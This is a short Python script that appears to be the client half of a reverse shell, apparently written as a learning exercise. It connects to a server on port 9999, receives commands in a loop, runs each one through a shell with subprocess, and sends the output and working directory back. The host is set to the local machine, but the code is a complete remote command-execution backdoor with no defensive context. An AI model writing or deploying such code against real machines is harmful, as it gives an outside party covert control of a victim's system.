import socket
import os
import subprocess

s = socket.socket()
host = socket.gethostbyname(socket.gethostname()) # IP address of the server
port = 9999 # Port to listen on (non-privileged ports are > 1023)

s.connect((host, port))

while True:
    data = s.recv(1024) # amount of data Receive data from server
    #if want to go back to the previous directory
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8")) # get rest to change directory

    #check for commands
    if len(data) > 0:
        #opens a shell and executes the command
        #out , error, in
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read() #if theres an error or output it will be stored in output_bytes
        output_str = str(output_bytes, "utf-8") #convert to string
        currentWD = os.getcwd() + "> " #get current working directory
        s.send(str.encode(output_str + currentWD)) #send output to server
        print(output_str)